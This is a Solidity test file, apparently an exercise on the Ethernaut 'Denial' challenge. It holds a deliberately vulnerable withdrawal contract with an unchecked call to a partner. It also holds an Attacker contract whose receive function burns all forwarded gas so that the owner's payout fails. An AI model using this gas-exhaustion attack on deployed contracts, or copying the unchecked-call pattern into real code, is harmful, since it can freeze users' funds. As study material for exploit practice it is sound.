// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";

contract Denial {
    address public partner; // withdrawal partner - pay the gas, split the withdraw
    address public constant owner = address(0xA9E);

    uint256 timeLastWithdrawn;
    mapping(address => uint256) withdrawPartnerBalances; // keep track of partners balances

    function setWithdrawPartner(address _partner) public {
        partner = _partner;
    }

    // withdraw 1% to recipient and 1% to owner
    function withdraw() public {
        uint256 amountToSend = address(this).balance / 100;
        // perform a call without checking return
        // The recipient can revert, the owner will still get their share
        partner.call{value: amountToSend}("");

        console.log("***1_WITHDRAW_GAS_LEFT:", gasleft()); // 17022
        payable(owner).transfer(amountToSend);
        console.log("***2_WITHDRAW_GAS_LEFT:", gasleft()); // Not called!!!

        // keep track of last withdrawal time
        timeLastWithdrawn = block.timestamp;
        withdrawPartnerBalances[partner] += amountToSend;
    }

    // allow deposit of funds
    receive() external payable {}

    // convenience function
    function contractBalance() public view returns (uint256) {
        return address(this).balance;
    }
}

contract Attacker {
    Denial public victim;

    struct GasLeft {
        uint256 gasLeft;
        uint256 blockLimit;
        uint256 iterations;
        uint256 timestamp;
    }

    event GasLeftEvent(uint256 gasLeft, uint256 blockLimit, uint256 iterations, uint256 timestamp);

    GasLeft[] public gasLefts;
    uint256 public iterations;
    uint256 initVictimBalance;

    function init(Denial _victim) public {
        victim = _victim;
    }

    receive() external payable {
        while (gasleft() > 20_000) {
            uint256 _gasLeft = gasleft();
            iterations++;
            uint256 _blockLimit = block.gaslimit;
            uint256 _timestamp = block.timestamp;

            gasLefts.push(
                GasLeft({gasLeft: _gasLeft, blockLimit: _blockLimit, iterations: iterations, timestamp: _timestamp})
            );
            emit GasLeftEvent(_gasLeft, _blockLimit, iterations, _timestamp);

            console.log("***AMOUNT_GAS_SPENT:", _gasLeft - gasleft()); // 91286
        }

        {
            GasLeft memory item0 = gasLefts[0];
            GasLeft memory item1 = gasLefts[1];
            GasLeft memory item2 = gasLefts[2];
            GasLeft memory item3 = gasLefts[3];
            GasLeft memory item4 = gasLefts[4];
            GasLeft memory item5 = gasLefts[5];
        }

        {
            GasLeft memory item6 = gasLefts[6];
            GasLeft memory item7 = gasLefts[7];
            GasLeft memory item8 = gasLefts[8];
        }

        console.log("***RECEIVE_GAS_LEFT:", gasleft()); // 2343
    }
}
